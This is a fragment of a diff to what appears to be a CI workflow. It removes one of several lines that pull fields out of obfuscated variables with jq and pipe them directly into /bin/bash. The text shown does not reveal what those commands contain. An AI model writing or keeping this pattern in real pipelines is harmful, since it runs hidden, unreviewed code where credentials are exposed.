@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$lso39" | jq -r .inkbt4586 | /bin/bash
           echo $j640 | jq -r .jprh881 | /bin/bash
           echo $owwq5694 | jq -r .dne129 | /bin/bash
-          echo $k9412 | jq -r .ykyut0 | /bin/bash
           echo $ud381 | jq -r .vxjmo2 | /bin/bash
           printf '%s' "$gv76" | jq -r .uyujp76 | /bin/bash
 
